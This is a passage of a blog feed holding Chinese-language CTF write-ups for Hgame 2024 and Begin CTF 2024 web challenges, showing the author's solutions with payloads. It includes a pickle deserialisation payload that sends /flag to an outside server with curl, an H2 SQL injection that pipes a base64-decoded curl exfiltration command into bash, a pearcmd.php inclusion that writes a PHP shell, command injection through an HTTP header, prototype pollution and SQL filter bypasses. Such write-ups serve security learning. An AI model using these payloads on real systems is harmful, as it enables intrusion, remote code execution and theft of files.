class="hljs-keyword">if</span> (!username) &#123;<br>    res.<span class="hljs-title function_">sendStatus</span>(<span class="hljs-number">403</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">let</span> url = (<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(req.<span class="hljs-property">query</span>.<span class="hljs-property">url</span>);<br>    &#125; <span class="hljs-keyword">catch</span> &#123;<br>      res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>);<br>      res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;invalid url.&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">undefined</span>;<br>    &#125;<br>  &#125;)<br></code></pre></td></tr></table></figure><p>这里的host只能是他给定的东西，也就是baidu.com才能通过检测。那么我们就需要在strategy里添加一句”127.0.0.1”:true ，方可拿到flag。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">dst, src</span>) &#123;<br>  <span class="hljs-keyword">for</span> (key <span class="hljs-keyword">in</span> src) &#123;<br>    <span class="hljs-keyword">if</span> (key.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;__&quot;</span>) != -<span class="hljs-number">1</span>) &#123;<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> src[key] == <span class="hljs-string">&quot;object&quot;</span> &amp;&amp; dst[key] !== <span class="hljs-literal">undefined</span>) &#123;<br>      <span class="hljs-title function_">update</span>(dst[key], src[key]);<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    dst[key] = src[key];<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这是一段很明显的marge函数，需要进行原型链污染，而调用update的函数点在&#x2F;user&#x2F;info路由里。而且要用post方法，在body里传参数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/user/info&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>) &#123;<br>    res.<span class="hljs-title function_">sendStatus</span>(<span class="hljs-number">403</span>);<br>  &#125;<br>  <span class="hljs-title function_">update</span>(userStorage[req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>].<span class="hljs-property">info</span>, req.<span class="hljs-property">body</span>);<br>  res.<span class="hljs-title function_">sendStatus</span>(<span class="hljs-number">200</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>nodejs原型链污染是不可以改属性值的，所以不能通过直接在strategy: {}里添加127.0.0.1：true</p><p>我们知道当系统找127.0.0.1的时候，子类没有，就会去找他的父类（原型），所以我们只需要污染原型即可。</p><p><strong>{“constructor”:{“prototype”:{“127.0.0.1”:true}}}</strong></p><p>在&#x2F;user&#x2F;info路由post传参：</p><p><img src="/img/Hgame_2024/22.png" alt="图片.png"></p><p>记得把Content-Type:改成json</p><p>传参后进入&#x2F;proxy?url&#x3D;<a href="http://127.0.0.1:3000/flag">http://127.0.0.1:3000/flag</a></p><p>此时会下载下来一个文件，打开文件即可拿到flag。</p><p><strong>hgame{c146c76e1eab87f22361cf90e08e51586daeba8b}</strong></p>]]></content>
    
    
    <categories>
      
      <category>WPs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WPs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hgame 2024 week 2</title>
    <link href="/2024/02/06/Hgame-2024-week-2/"/>
    <url>/2024/02/06/Hgame-2024-week-2/</url>
    
    <content type="html"><![CDATA[<p>by:Infernity</p><h1 id="Select-More-Courses"><a href="#Select-More-Courses" class="headerlink" title="Select More Courses"></a><strong>Select More Courses</strong></h1><p>提示已经给的很明显了，弱密码爆破，拿上密码字典去burp里爆破。</p><p><img src="/img/Hgame_2024/13.png" alt="图片.png"></p><p>爆出密码为qwert123</p><p>然后进入选课界面，发现已达到学分上限，没法选课，那就退出来看第一个增加学分的页面，给了提示：</p><p>Race against time!</p><p><img src="/img/Hgame_2024/14.png" alt="图片.png"></p><p>跟上次一样，无限发包，大概发个几百个即可。</p><p>现在退回到选课界面，发现最高学分已经超出很多了。</p><p><img src="/img/Hgame_2024/15.png" alt="图片.png"></p><p>直接选课拿flag</p><p><strong>hgame{5ak_p45sW0rD_&amp;_r4Ce_c0nDiT10n}</strong></p><h1 id="What-the-cow-say"><a href="#What-the-cow-say" class="headerlink" title="What the cow say?"></a><strong>What the cow say?</strong></h1><p>回显输入的东西，怀疑后台是echo，试试内敛执行。</p><p>`ls`能看到回显，那这道题就是绕过过滤了。直接看看app.py，发现cat被过滤，试试`tac app.py&#96;</p><p><img src="/img/Hgame_2024/16.png" alt="图片.png"></p><p>这是源码，发现过滤了这些。</p><p>根目录有个flag_is_here，那么因为过滤了flag，就用通配符。</p><p>`tac &#x2F;f*&#96;发现打不开，说这个是文件夹，那么进入这个文件夹看看。</p><p>`ls &#x2F;f*&#96;发现还有个flag文件，打开这个，同样用通配符：</p><p>`tac &#x2F;f*&#x2F;f*&#96;</p><p><strong>hgame{C0wsay_be_c4re_aB0ut_ComMand_Injecti0n}</strong></p><h1 id="myflask"><a href="#myflask" class="headerlink" title="myflask"></a><strong>myflask</strong></h1><p>给了源码，在&#x2F;flag接口处验证我们的session token 是不是admin，还给了SECRET_KEY</p><p>但是key需要我们先去破译</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">currentDateAndTime = datetime.now(timezone(<span class="hljs-string">&#x27;Asia/Shanghai&#x27;</span>))<br>currentTime = currentDateAndTime.strftime(<span class="hljs-string">&quot;%H%M%S&quot;</span>)<br></code></pre></td></tr></table></figure><p>这段代码是获取当前时间。说明密钥是创建这个实例当时的时间，可以在创建实例之前自己在python里运行一下代码，得到当前时间，再把时间往后倒退几位来测试密钥。</p><p>接着就把username改成admin</p><p><img src="/img/Hgame_2024/17.png" alt="图片.png"></p><p>然后打入cookie，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># For POST requests from admin</span><br><span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>    pickle_data=base64.b64decode(request.form.get(<span class="hljs-string">&#x27;pickle_data&#x27;</span>))<br>    <span class="hljs-comment"># Tips: Here try to trigger RCE</span><br>    userdata=pickle.loads(pickle_data)<br></code></pre></td></tr></table></figure><p>这一段是post传参pickle_data，然后pickle反序列化，别忘了payload还要base64加密一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>,(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>,))<br>a = A()<br><span class="hljs-built_in">print</span>(base64.b64encode(pickle.dumps(a)))<br></code></pre></td></tr></table></figure><p>运行后打入payload。</p><p><strong>hgame{876a9e31bd250d49befe59230ca95882fd6d2a5d}</strong></p><h1 id="search4member"><a href="#search4member" class="headerlink" title="search4member"></a>search4member</h1><p>这道题给了docker包，里面是java编写的。</p><p>这道题看似是sql注入，其实是sql注入，只不过是java sql注入。</p><p>更近一步说是h2sql注入。</p><p><a href="https://www.anquanke.com/post/id/181032#h2-2">https://www.anquanke.com/post/id/181032#h2-2</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1</span><span class="hljs-string">&#x27;CREATE ALIAS EXEC AS CONCAT(&#x27;</span><span class="hljs-keyword">void</span> <span class="hljs-title function_">e</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> java.io.IOException<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">HEXTORAW(&#x27;</span>007b<span class="hljs-string">&#x27;),&#x27;</span>java.lang.Runtime rt= java.lang.Runtime.getRuntime();<br>rt.exec(cmd);<span class="hljs-string">&#x27;,HEXTORAW(&#x27;</span><span class="hljs-number">007d</span><span class="hljs-string">&#x27;));</span><br><span class="hljs-string">CALL EXEC(&#x27;</span>whoami<span class="hljs-string">&#x27;);--+</span><br></code></pre></td></tr></table></figure><p>但是这里不能直接执行命令，这里是无回显的。那么可以尝试curl外带文件，但是这道题不出网，那就只能DNS外带文件。</p><p>x&#x3D;base64(curl `cat &#x2F;f*&#96;.你的DNS网址)</p><p>bash -c {echo,这里放x}|{base64,-d}|{bash,-i}</p><p>去在线网站找个DNSlog网址，拿到DNS网址后base64加密嵌入payload当中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;CREATE ALIAS EXEC AS CONCAT(&#x27;</span><span class="hljs-keyword">void</span> <span class="hljs-title function_">e</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> java.io.IOException<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">HEXTORAW(&#x27;</span>007b<span class="hljs-string">&#x27;),&#x27;</span>java.lang.Runtime rt= java.lang.Runtime.getRuntime();<br>rt.exec(cmd);<span class="hljs-string">&#x27;,HEXTORAW(&#x27;</span><span class="hljs-number">007d</span><span class="hljs-string">&#x27;));</span><br><span class="hljs-string">CALL EXEC(&#x27;</span>bash -c &#123;echo,Y3VybCBgY2F0IC9mKmAuaGNlczZoZmMucmVxdWVzdHJlcG8uY29t&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<br><span class="hljs-string">&#x27;);--+</span><br></code></pre></td></tr></table></figure><p>把这一段payload直接打进去，然后在dnslog查看request。</p><p><img src="/img/Hgame_2024/18.png" alt="图片.png"></p><p><strong>hgame{a124e279c953d7c44d4c839f209b004ff4261084}</strong></p>]]></content>
    
    
    <categories>
      
      <category>WPs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WPs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Begin CTF 2024</title>
    <link href="/2024/02/05/Begin-CTF-2024/"/>
    <url>/2024/02/05/Begin-CTF-2024/</url>
    
    <content type="html"><![CDATA[<p>by:Infernity</p><h1 id="zupload"><a href="#zupload" class="headerlink" title="zupload"></a>zupload</h1><p>给了源码，看下index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;GET&#x27;</span>) &#123;     <span class="hljs-comment">//判断是否是GET方法</span><br>  <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>])) &#123;       <span class="hljs-comment">//如果没有action参数就重定向</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: /?action=upload&#x27;</span>);<br>    <span class="hljs-keyword">die</span>();<br>  &#125;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]));<span class="hljs-comment">//重要函数，直接打flag</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;    <span class="hljs-comment">//是post方法报错</span><br>  <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;error&#x27;</span>,<br>    <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;Not implemented yet&#x27;</span><br>  ));<br>&#125;<br></code></pre></td></tr></table></figure><p>我把注释打在上面。</p><p>所以打入?action&#x3D;&#x2F;flag即可读出flag。</p><p><strong>begin{jUS7_r34d_ace11d9d89a0}</strong></p><h1 id="zupload-pro"><a href="#zupload-pro" class="headerlink" title="zupload-pro"></a>zupload-pro</h1><p>这里重复的代码块不再列出，就列出主要代码块。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;/&#x27;</span> || <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>], <span class="hljs-string">&#x27;..&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;h1&gt;Invalid action&lt;/h1&gt;&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]));<br></code></pre></td></tr></table></figure><p>现在我们的action的参数第一个不能是&#x2F;，且不能有..</p><p>我本来第一反应是第一个不能是斜杠，那么就目录穿越..&#x2F;..&#x2F;..&#x2F;flag</p><p>但是这里直接把..ban了。</p><p>file_get_contents函数有个性质，可以用伪协议，这里直接加入file:&#x2F;&#x2F;伪协议读文件</p><p><strong>?action&#x3D;file:&#x2F;&#x2F;&#x2F;flag</strong></p><p><strong>begin{1s_tHlS_4_W3b5hEI1_0ca746cb0902}</strong></p><h1 id="zupload-pro-plus"><a href="#zupload-pro-plus" class="headerlink" title="zupload-pro-plus"></a>zupload-pro-plus</h1><p>题出的真撇&#x3D;-&#x3D;</p><p>跟上一题的payload一模一样直接过。</p><p><strong>begin{5trAN6e_suFflX_57341c648eaa}</strong></p><h1 id="zupload-pro-plus-max"><a href="#zupload-pro-plus-max" class="headerlink" title="zupload-pro-plus-max"></a>zupload-pro-plus-max</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;/&#x27;</span> || <span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>], <span class="hljs-string">&#x27;/&#x27;</span>) &gt; <span class="hljs-number">1</span>) &#123;<br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;h1&gt;Invalid action&lt;/h1&gt;&#x27;</span>);<br>   &#125;<br>   <span class="hljs-keyword">die</span>(<span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]));<br></code></pre></td></tr></table></figure><p>这里关键函数被改成了include，判断条件为第一个不能是&#x2F;，而且payload里最多一个&#x2F;</p><p>这里相当于禁用了伪协议，因为伪协议都是xxx:&#x2F;&#x2F;开头的，而且禁用了目录穿越，目录穿越一般也要很多斜杠。</p><p>发现pearcmd.php在当前目录可以裸文件包含</p><p>?action&#x3D;pearcmd.php&amp;+config-create+&#x2F;&lt;?&#x3D;`env&#96;?&gt;+&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php</p><p>然后去看1.php直接找到flag</p><p><strong>begin{EV1l_Z1P_e022ad893425}</strong></p><h1 id="zupload-pro-plus-max-ultra"><a href="#zupload-pro-plus-max-ultra" class="headerlink" title="zupload-pro-plus-max-ultra"></a>zupload-pro-plus-max-ultra</h1><p>一眼丁真，这里没有任何可以包含文件的地方，只有一个关键函数exec()这个函数可以执行命令，但是无回显。</p><p>我把关键代码块列出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$extract_to</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_EXTRACT_TO&#x27;</span>] ?? <span class="hljs-string">&#x27;uploads/&#x27;</span>;<br><br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;unzip &#x27;</span> . <span class="hljs-variable">$file_tmp</span> . <span class="hljs-string">&#x27; -d &#x27;</span> . <span class="hljs-variable">$extract_to</span>);<br></code></pre></td></tr></table></figure><p>就这两句，第一句是检查请求头中有没有X-EXTRACT-TO头，如果没有，就$extract_to&#x3D;’uploads&#x2F;‘;</p><p>那么要做什么显而易见了，我们在上传文件的时候手动添加一个请求头，把请求头的参数设置为我们的payload，然后系统就会自动执行了。</p><p>这里先&#x2F;tmp;满足前面unzip name -d path的条件，然后分号执行我们下面的命令，由于他无回显，我们就把flag放到当前目录，然后再打开即可。</p><p>X-EXTRACT-TO:&#x2F;tmp;cat &#x2F;flag&gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt</p><p>执行完毕后，打开1.txt拿到flag</p><p><strong>begin{cMD_lNjECTeD_2d9d7d54c4a2}</strong></p><h1 id="zupload-pro-plus-max-ultra-premium"><a href="#zupload-pro-plus-max-ultra-premium" class="headerlink" title="zupload-pro-plus-max-ultra-premium"></a>zupload-pro-plus-max-ultra-premium</h1><p>这道题吧文件名加密后还经过安全处理，我们完全不能通过exec函数下手了，但是这道题还是给我们解压了，所以可以用软链接的方式拿到flag</p><p>新建一个空白文件夹，在文件夹里打开终端，打入以下命令。</p><p>ln -s &#x2F;flag flag</p><p>zip -y flag.zip flag</p><p>然后把flag.zip上传，进入uploads&#x2F;flag</p><p>下载下来后就是我们需要的flag了。</p><p><strong>begin{s0_sOFt_039762d9dda7}</strong></p><h1 id="zupload-pro-revenge"><a href="#zupload-pro-revenge" class="headerlink" title="zupload-pro-revenge"></a><strong>zupload-pro-revenge</strong></h1><p>查看源码，发现没有后端验证，传一个zip，然后抓包改成php即可，直接连。</p><p><strong>flag{34dd54d7-4e2f-4441-973a-d3f79c226858}</strong></p><h1 id="zupload-pro-plus-enhanced"><a href="#zupload-pro-plus-enhanced" class="headerlink" title="zupload-pro-plus-enhanced"></a>zupload-pro-plus-enhanced</h1><p>源码里有这样一段$file_ext &#x3D; strtolower($file_ext[1]);</p><p>这是看后缀的倒数第二个检查是不是zip</p><p>所以传文件为xxx.zip，然后抓包，改为xxx.zip.php</p><p>这就是我们的马了，直接连上去就好了。</p><p><strong>flag{cf280ea2-db60-48af-bea2-ab6070f41f30}</strong></p><h1 id="SQL-注入教学局"><a href="#SQL-注入教学局" class="headerlink" title="SQL 注入教学局"></a>SQL 注入教学局</h1><p>过滤空格，and，or，select，load，from</p><p>这些都可以双写绕过</p><p>1’&#x2F;<strong>&#x2F;union&#x2F;</strong>&#x2F;selselectect&#x2F;<strong>&#x2F;group_concat(flag)&#x2F;</strong>&#x2F;frfromom&#x2F;**&#x2F;secret.passwoorrd#</p><p>这是第一段flag{bc925e53-</p><p>第二段给了表名列名直接查就行</p><p>1’&#x2F;<strong>&#x2F;union&#x2F;</strong>&#x2F;selselectect&#x2F;<strong>&#x2F;grade&#x2F;</strong>&#x2F;frfromom&#x2F;<strong>&#x2F;scoorre&#x2F;</strong>&#x2F;where&#x2F;<strong>&#x2F;student&#x2F;</strong>&#x2F;like&#x2F;**&#x2F;‘begin’#</p><p>92c5-4a28-9ddc</p><p>1’&#x2F;<strong>&#x2F;union&#x2F;</strong>&#x2F;selselectect&#x2F;**&#x2F;loloadad_file(“&#x2F;flag”)#</p><p>这是第三段-37ea50e97afe} </p><p><strong>flag{bc925e53-92c5-4a28-9ddc-37ea50e97afe}</strong> </p><h1 id="POPgadget"><a href="#POPgadget" class="headerlink" title="POPgadget"></a>POPgadget</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Fun</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&#x27;call_user_func_array&#x27;</span>;<br>  &#125;<br><br>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>  &#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>=<span class="hljs-string">&#x27;phpinfo&#x27;</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>&#125;<br><br><span class="hljs-variable">$x</span>= <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br><span class="hljs-variable">$x</span>-&gt;a=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$x</span>-&gt;a-&gt;a=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">fun</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$x</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>最后注意call_user_func和call_user_func_array的用法和参数位置即可。</p><p><strong>flag{fc369b30-0f07-4be7-9b95-34716bfce712}</strong></p><h1 id="pickelshop"><a href="#pickelshop" class="headerlink" title="pickelshop"></a><strong>pickelshop</strong></h1><p>一眼pickel反序列化，在注册界面注册，发现给了一个cookie</p><p><img src="/img/qwr89szx328u2d3a6.png" alt="图片.png"></p><p>那么就在登录界面打payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>,(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;curl -d @/flag xx.xxx.xxx.xxx:2333&#x27;)&quot;</span>,))<br>a = A()<br><span class="hljs-built_in">print</span>(base64.b64encode(pickle.dumps(a)))<br></code></pre></td></tr></table></figure><p>cookie:user&#x3D;………………</p><p>然后在服务器上监听2333端口</p><p>发包，拿到flag。</p><p><strong>flag{9ef7a78b-4e25-4d80-b805-90e5aa152f61}</strong></p>]]></content>
    
    
    <categories>
      
      <category>WPs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WPs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hgame 2024 week 1</title>
    <link href="/2024/01/31/Hgame%202024%20week%201/"/>
    <url>/2024/01/31/Hgame%202024%20week%201/</url>
    
    <content type="html"><![CDATA[<p>by:Infernity</p><h1 id="ezHTTP"><a href="#ezHTTP" class="headerlink" title="ezHTTP"></a>ezHTTP</h1><p>请从vidar.club访问这个页面</p><p>在请求头中插入</p><p>referer:vidar.club</p><p>请通过Mozilla&#x2F;5.0 (Vidar; VidarOS x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;121.0.0.0 Safari&#x2F;537.36 Edg&#x2F;121.0.0.0访问此页面</p><p>明显的UA头，修改UA头为以上。</p><p>请从本地访问这个页面</p><p>本地访问不止X-Forwarded-For一个头，有很多种，这里是X-Real-IP:127.0.0.1</p><p>最后拿到一串字符串</p><p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJGMTRnIjoiaGdhbWV7SFRUUF8hc18xbVAwclQ0bnR9In0.VKMdRQllG61JTReFhmbcfIdq7MvJDncYpjaT7zttEDc</p><p>base64解密后拿到flag</p><p><strong>hgame{HTTP_!s_1mP0rT4nt}</strong></p><p>当然这里不是base64，但是对于拿到flag来说，base64解密已经够了。解密时记得去掉点号。</p><p><img src="/img/Hgame_2024/1.png" alt="图片.png"></p><h1 id="Bypass-it"><a href="#Bypass-it" class="headerlink" title="Bypass it"></a>Bypass it</h1><p>一个登录注册题，但是不让我注册</p><p><img src="/img/Hgame_2024/2.png" alt="图片.png"></p><p>弹窗一看就是JavaScript弄的，但是为了严谨，查看源码，注册那里有个&#x2F;register_page.php</p><p><img src="/img/Hgame_2024/3.png" alt="图片.png"></p><p>点进去发现这样一段代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script language=<span class="hljs-string">&#x27;javascript&#x27;</span> defer&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;很抱歉，当前不允许注册&#x27;</span>);top.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;login.html&#x27;</span>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>这段代码是直接弹个窗，然后重定向到Login页面。那么好，直接禁用js就可以了，关于哪个浏览器如何禁用js这里不再赘述。</p><p>禁用后，就可以注册了，注册后退回到login界面，登录后一片白，但是看源码发现这里也是通过js重定向到userIndex.php页面，但是我们禁用了JS，这里就不会跳转，那我们就手动跳转入userIndex.php，进去后点击click here 拿到flag</p><p> <strong>hgame{5ca7e8897ddd8913d4d1fcba65e55acf7cfa8827}</strong></p><h1 id="SeleSelect-Courses"><a href="#SeleSelect-Courses" class="headerlink" title="SeleSelect Courses"></a><strong>SeleSelect Courses</strong></h1><p>这道题我不知道是哪来的什么提示或者是在考啥。进入后抓取选课的包，重复发同一个包<strong>几千遍</strong>，就会有一次选上，重复这个流程，直到五个都被选上，我这里是用burp发包的，写脚本亦可。</p><p><img src="/img/Hgame_2024/4.png" alt="图片.png"></p><p>五个都选上后拿到flag</p><p><img src="/img/Hgame_2024/5.png" alt="图片.png"></p><p><strong>begin{WELCOMe_to_B3GinCTF_2024_H0Pe_YOU_wiL1_11ke_i7}</strong></p><h1 id="2048-16"><a href="#2048-16" class="headerlink" 